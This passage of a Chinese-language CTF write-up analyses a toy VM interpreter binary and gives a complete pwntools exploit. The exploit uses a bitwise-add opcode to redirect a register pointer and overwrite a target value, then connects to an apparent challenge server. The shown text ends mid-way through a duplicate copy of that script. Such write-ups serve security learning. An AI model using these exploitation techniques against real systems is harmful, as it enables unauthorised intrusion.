style="color:#DBD7CAEE">    carry_in </span><span style="color:#666666">=</span><span style="color:#80A665"> read_val</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#DBD7CAEE">    v8 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> carry_in </span><span style="color:#CB7676">^</span><span style="color:#DBD7CAEE"> d_ </span><span style="color:#CB7676">^</span><span style="color:#DBD7CAEE"> b_</span><span style="color:#666666">;</span><br><span style="color:#80A665">    write_val</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> b_ </span><span style="color:#CB7676">&#x26;</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">carry_in </span><span style="color:#CB7676">|</span><span style="color:#DBD7CAEE"> d_</span><span style="color:#d9739f">)</span><span style="color:#CB7676"> |</span><span style="color:#DBD7CAEE"> carry_in </span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE"> d_</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">    write_val</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#CB7676">unsigned</span><span style="color:#DBD7CAEE"> __int8</span><span style="color:#d9739f">)</span><span style="color:#BD976A">cur</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">oper1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> v8</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">  </span><span style="color:#4d9375">}</span><br><span style="color:#4D9375">  else</span><br><span style="color:#666666">  </span><span style="color:#4d9375">{</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#CB7676">unsigned</span><span style="color:#DBD7CAEE"> __int8</span><span style="color:#d9739f">)</span><span style="color:#BD976A">cur</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">op</span><span style="color:#CB7676"> </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 4</span><span style="color:#CB7676">u</span><span style="color:#666666"> </span><span style="color:#d4976c">)</span><br><span style="color:#4D9375">      goto</span><span style="color:#DBD7CAEE"> LABEL_14</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    switch</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE"> op </span><span style="color:#d4976c">)</span><br><span style="color:#666666">    </span><span style="color:#d4976c">{</span><br><span style="color:#4D9375">      case</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">:</span><br><span style="color:#80A665">        write_val</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#e6cc77">(</span><span style="color:#CB7676">unsigned</span><span style="color:#DBD7CAEE"> __int8</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">cur</span><span style="color:#CB7676">-</span><span style="color:#CB7676">></span><span style="color:#BD976A">oper1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> d_ </span><span style="color:#CB7676">|</span><span style="color:#DBD7CAEE"> b_</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">        break</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      case</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">:</span><br><span style="color:#80A665">        write_val</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#e6cc77">(</span><span style="color:#CB7676">unsigned</span><span style="color:#DBD7CAEE"> __int8</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">cur</span><span style="color:#CB7676">-</span><span style="color:#CB7676">></span><span style="color:#BD976A">oper1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> d_ </span><span style="color:#CB7676">^</span><span style="color:#DBD7CAEE"> b_</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">        break</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      case</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">:</span><br><span style="color:#80A665">        write_val</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">count</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#e6cc77">(</span><span style="color:#CB7676">unsigned</span><span style="color:#DBD7CAEE"> __int8</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">cur</span><span style="color:#CB7676">-</span><span style="color:#CB7676">></span><span style="color:#BD976A">oper1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> d_ </span><span style="color:#CB7676">&#x26;</span><span style="color:#BD976A"> b_</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">        break</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      default</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">LABEL_14:</span><br><span style="color:#80A665">        printf</span><span style="color:#d9739f">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">未知操作码: 0x</span><span style="color:#C99076">%02x\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#e6cc77">(</span><span style="color:#CB7676">unsigned</span><span style="color:#DBD7CAEE"> __int8</span><span style="color:#e6cc77">)</span><span style="color:#DBD7CAEE">cur</span><span style="color:#CB7676">-</span><span style="color:#CB7676">></span><span style="color:#BD976A">op</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        exit</span><span style="color:#d9739f">(</span><span style="color:#4C9A91">1</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#d4976c">}</span><br><span style="color:#666666">  </span><span style="color:#4d9375">}</span><br><span style="color:#DBD7CAEE">  result </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> count</span><span style="color:#666666">;</span><br><span style="color:#CB7676">  ++</span><span style="color:#BD976A">count</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">pc</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  return</span><span style="color:#DBD7CAEE"> result</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>重点在这里的操作 4，实现了一个 1 位可进位全加器，通过这个操作 4 可以按字节给某个地址加数。虽然程序原先的功能里，无法写到 <code class="inline-code">0x4097</code> 处，但是可以写到结构体指针 <code class="inline-code">*reg</code>，于是思路如下：</p>
<ol>
<li>修改 <code class="inline-code">*reg</code> 到 <code class="inline-code">0x4097</code></li>
<li>写 <code class="inline-code">0x4097</code> 为 <code class="inline-code">$rebase(0x4097) - 0xdeadbeef</code>，这里可以按字节写。</li>
</ol>
<p>exp:</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./pwn2</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">39.106.16.204</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 13242</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    decompiler connect ida --host 127.0.0.1 --port 3662</span><br><span style="color:#B56959">    breakrva 0x0173A</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> gen_code</span><span style="color:#2993a3">(</span><span style="color:#393A34">op</span><span style="color:#999999">,</span><span style="color:#393A34"> val1</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#393A34"> val2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">op</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">val1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">flag</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">val2</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> xor</span><span style="color:#2993a3">(</span><span style="color:#393A34">val1</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#393A34"> val2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> gen_code</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#393A34"> val1</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#393A34"> val2</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> _and</span><span style="color:#2993a3">(</span><span style="color:#393A34">val1</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#393A34"> val2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> gen_code</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#999999">,</span><span style="color:#393A34"> val1</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#393A34"> val2</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> _or</span><span style="color:#2993a3">(</span><span style="color:#393A34">val1</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#393A34"> val2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> gen_code</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#393A34"> val1</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#393A34"> val2</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> add</span><span style="color:#2993a3">(</span><span style="color:#393A34">val1</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#393A34"> val2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> gen_code</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#999999">,</span><span style="color:#393A34"> val1</span><span style="color:#999999">,</span><span style="color:#393A34"> flag</span><span style="color:#999999">,</span><span style="color:#393A34"> val2</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">""</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> _or</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">1f</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 4</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> add</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">f</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> _or</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">e</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">6</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> j </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> _or</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">18</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> i</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> j</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">c</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> i</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> j</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">src </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">7f</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">b0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">68</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">9f</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">e4</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">target </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">a8</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">f1</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ba</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">c0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">e3</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#2993a3">]</span><br><br><span style="color:#1E754F">for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> _and</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0">    # for j in range(src[i], target[i]):</span><br><span style="color:#A0ADA0">    #     payload += _and(0, 1, 0)</span><br><span style="color:#A0ADA0">    #     payload += add((0x18 + i) * 8 + 0, 1, 1)</span><br><span style="color:#A0ADA0">    #     for k in range(1, 7):</span><br><span style="color:#A0ADA0">    #          payload += add((0x18 + i) * 8 + k, 1, 0)</span><br><span style="color:#393A34">    tmp </span><span style="color:#999999">=</span><span style="color:#393A34"> target</span><span style="color:#2993a3">[</span><span style="color:#393A34">i</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> src</span><span style="color:#2993a3">[</span><span style="color:#393A34">i</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    s </span><span style="color:#999999">=</span><span style="color:#998418"> bin</span><span style="color:#2993a3">(</span><span style="color:#393A34">tmp</span><span style="color:#2993a3">)</span><span style="color:#2993a3">[</span><span style="color:#2F798A">2</span><span style="color:#999999">:</span><span style="color:#2993a3">]</span><span style="color:#999999">.</span><span style="color:#393A34">rjust</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">0</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#2993a3">[</span><span style="color:#999999">::</span><span style="color:#AB5959">-</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> j </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> s</span><span style="color:#2993a3">[</span><span style="color:#393A34">j</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> "</span><span style="color:#B56959">0</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><br><span style="color:#393A34">            payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> add</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">18</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> i</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> j</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        elif</span><span style="color:#393A34"> s</span><span style="color:#2993a3">[</span><span style="color:#393A34">j</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> "</span><span style="color:#B56959">1</span><span style="color:#B5695977">"</span><span style="color:#999999">:</span><br><span style="color:#393A34">            payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> add</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">18</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> i</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> j</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Code Count:</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#998418">len</span><span style="color:#a65e2b">(</span><span style="color:#393A34">payload</span><span style="color:#a65e2b">)</span><span style="color:#AB5959"> //</span><span style="color:#2F798A"> 4</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Code: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./pwn2</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">39.106.16.204</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 13242</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    decompiler connect ida --host 127.0.0.1 --port 3662</span><br><span style="color:#C98A7D">    breakrva 0x0173A</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> gen_code</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">val1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">flag</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">val2</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> xor</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">val1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> gen_code</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val2</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> _and</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">val1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> gen_code</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val2</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> _or</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">val1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> gen_code</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val2</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">val1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> gen_code</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flag</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> val2</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">""</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> _or</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">1f</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 8</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">,</span><span 